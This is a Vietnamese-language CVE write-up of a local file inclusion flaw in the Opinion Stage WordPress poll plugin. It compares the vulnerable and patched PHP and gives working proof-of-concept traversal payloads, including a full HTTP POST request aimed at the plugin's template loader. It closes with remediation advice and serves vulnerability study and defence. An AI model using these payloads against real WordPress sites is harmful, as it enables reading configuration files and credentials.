---
title: CVE-2025-53328 Analysis & POC
description: Security Vulnerability in WordPress Poll, Survey & Quiz Maker Plugin by Opinion Stage Plugin.
date: 2025-10-12 19:18:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, lfi]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Poll, Survey & Quiz Maker Plugin by Opinion Stage** phiên bản **≤ 19.11.0** chứa lỗ hổng **Local File Inclusion (CVE-2025-53328, CVSS 7.5)** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-53328](https://www.cve.org/CVERecord?id=CVE-2025-53328)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 19.11.0
* **Patched Versions**: 19.11.1
* **CVSS severity**: High (7.5) 
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Poll, Survey & Quiz Maker Plugin by Opinion Stage Plugin](https://wordpress.org/plugins/social-polls-by-opinionstage/)

> [!IMPORTANT]
> Mặc dù lỗ hổng được công bố là **Unauthenticated**, trong thực tế việc khai thác đòi hỏi kẻ tấn công có quyền nội bộ tối thiểu — ví dụ tài khoản **Contributor** hoặc quyền tương đương trên WordPress

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Poll, Survey & Quiz Maker Plugin by Opinion Stage**: **19.11.0** (vulnerable) và **19.11.1** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```php  {filename="Modules/Admin.php v19.11.0" hl_lines=[13]}
private static function prepare_view_file_name_form_current_page() {
    $view_file_name = '';

    if ( !empty( $_REQUEST['page'] ) ) {
        $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] );
        $qry_str_check_os = explode( '-', $qry_str_check_os );
        if ( 'opinionstage' === $qry_str_check_os[0] ) {
            $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) );
            $view_file_name = str_replace( '-', '_', $view_file_name );
        }
    }

    return $view_file_name;
}
```
Trong phiên bản **vulnerable**, `page` param được lấy từ `$_REQUEST` do người dùng kiểm soát nhưng **không xác minh hợp lệ của tên file** => Cho phép **Local File Inclusion**. Trong hàm này chỉ có các logic loại bỏ các ký tự HTML bằng `sanitize_text_field` và kiểm tra tiền tố `opinionstage-` sau đó loại bỏ tiền tố và thay `-` bằng `_` nên attacker có thể truyền:

```
?page=opinionstage-../../wp-config
```

**Bản vá**:
```php  {filename="Modules/Admin.php v19.11.1" hl_lines=[3,9,16,20]}
private static function prepare_view_file_name_from_current_page() {

    if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) {
        return '';
    }

    $page = sanitize_text_field($_REQUEST['page']);

    if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') {
        return '';
    }

    $template_name = substr($page, strlen('opinionstage-'));
    $template_name = str_replace('-', '_', $template_name);

    if (!in_array($template_name, self::$allowed_templates, true)) {
        return '';
    }

    if (strpos($template_name, '..') !== false ||
        strpos($template_name, '/') !== false ||
        strpos($template_name, '\\') !== false) {
        return '';
    }

    return $template_name;
}
```

Bản vá đã bổ sung nhiều lớp bảo vệ như kiểm tra kiểu dữ liệu, xác minh prefix `"opinionstage-"`, áp dụng whitelist (`self::$allowed_templates`), ngăn **traversal** ký tự nguy hiểm

### Vulnerable Code 
Hàm `prepare_view_file_name_form_current_page()` được gọi từ `load_template()`

```php {filename="Modules/Admin.php v19.11.0" hl_lines=[2,10]}
public static function load_template() {
    $view_file_name = self::prepare_view_file_name_form_current_page();
    if ( !$view_file_name ) {
        return;
    }

    $os_client_logged_in = Helper::is_user_logged_in();
    $os_options = Helper::get_opinionstage_option();

    TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) );
}
```

`require_template()` được gọi với đối số  `'admin/views/'.$view_file_name`

```php {filename="Infrastructure/TemplatesViewer.php v19.11.0" hl_lines=[9]}
public static function require_template($template_name, $args = []) {
    $path = Opinionstage::get_instance()->plugin_path . $template_name . '.php';

    if( ! file_exists( $path ) ) {
        return;
    }

    extract($args);
    require( $path );
}
```

`require()` hàm chính gây **LFI** được gọi với đối số `$path` là giá trị concat từ đường dẫn của plugin (`plugin_path`), `$template_name`, `.php`

```php {filename="Modules/Admin.php v19.11.0" hl_lines=[3,4,15,26]}
public function register_menu_page() {
    if ( function_exists( 'add_menu_page' ) ) {
        $os_client_logged_in = Helper::is_user_logged_in();
        if ( $os_client_logged_in ) {
            add_menu_page(
                __( 'Opinion Stage', 'social-polls-by-opinionstage' ),
                __( 'Opinion Stage', 'social-polls-by-opinionstage' ),
                'edit_posts',
                OPINIONSTAGE_MENU_SLUG,
                [ __CLASS__, 'load_template' ],
                Opinionstage::get_instance()->plugin_url . 'admin/images/os-icon.svg',
                '25.234323221'
            );
            add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'View My Items', 'My Items', 'edit_posts', OPINIONSTAGE_MENU_SLUG );
            add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'Tutorials & Help', 'Tutorials & Help', 'edit_posts', OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, 'load_template' ] );
        } else {
            add_menu_page(
                __( 'Opinion Stage', 'social-polls-by-opinionstage' ),
                __( 'Opinion Stage', 'social-polls-by-opinionstage' ),
                'edit_posts',
                OPINIONSTAGE_GETTING_STARTED_SLUG,
                [ __CLASS__, 'load_template' ],
                Opinionstage::get_instance()->plugin_url . 'admin/images/os-icon.svg',
                '25.234323221'
            );
            add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, 'Get Started', 'Get Started', 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, 'load_template' ] );
        }
    }
}
```

`register_menu_page()` sẽ register 2 submenu với `load_template` làm callback dựa trên trạng thái đăng nhập của người dùng

Để truy cập vào **submenu** của **admin** người dùng cần phải login vào WordPress với đặc quyền tối thiểu là **Contributor** => đặc quyền yêu cầu của CVE này là **Contributor**

2 slug được khai báo cho 2 submenu:

```php
const string OPINIONSTAGE_MENU_SLUG = "opinionstage-settings"
const string OPINIONSTAGE_GETTING_STARTED_SLUG = "opinionstage-getting-started"
```

## Exploit

### Proof of Concept (PoC)

1. Login bằng tài khoản Contributor
2. Gửi POST request:

```http
POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: vi,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/
Connection: keep-alive
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
X-PwnFox-Color: green
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

page=opinionstage-../payload
```

**Debugging**:

{{< figure src="debug1.png" caption="Debug - Giá trị của $view_file_name" >}}

{{< figure src="debug2.png" caption="Debug - Giá trị của $path được require" >}}

File `payload.php` được tạo để thử nghiệm

```php {filename="admin/views/payload.php v19.11.0" hl_lines=[2]}
<?php
echo "ABC";
```

**Result**

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

### Explain
Ta tận dụng cách WordPress và Plugin xử lý tham số: WordPress xác định trang quản trị dựa trên `page` trong URL, nhưng plugin lại đọc `page` từ `$_REQUEST` - mà `$_REQUEST` sẽ ưu tiên giá trị từ body khi request là POST. Vì vậy ta gửi một POST tới `admin.php?page=opinionstage-getting-started` (page hợp lệ trên URL để gọi callback), đồng thời đặt `page=opinionstage-../payload` trong body của POST. Kết quả: WordPress chấp nhận URL và gọi callback, còn plugin lấy `page` từ `$_REQUEST` (body) chứa payload `../` — cho phép vượt thư mục và khai thác LFI.

## Conclusion

CVE-2025-53328 là LFI do dùng input `page` không được kiểm soát để tạo đường dẫn file cho `require()` - tiền tố `opinionstage-` được chấp nhận nhưng phần sau có thể chứa `..` `/` `\` để vượt thư mục. Bản vá (v19.11.1) thêm kiểm tra kiểu, chặn traversal và **whitelist** template.

## Key takeaways

* Không dùng input user trực tiếp để xây path cho `include/require`.
* Áp dụng **whitelist** (hoặc mapping) cho tên template.
* Chặn `..`, `/`, `\` hoặc dùng `realpath()` so với thư mục gốc.
* Cập nhật plugin lên **19.11.1** ngay.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Poll, Survey & Quiz Maker Plugin by Opinion Stage Plugin <= 19.11.0 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/social-polls-by-opinionstage/vulnerability/wordpress-poll-survey-quiz-maker-plugin-by-opinion-stage-plugin-19-11-0-local-file-inclusion-vulnerability?_s_id=cve)

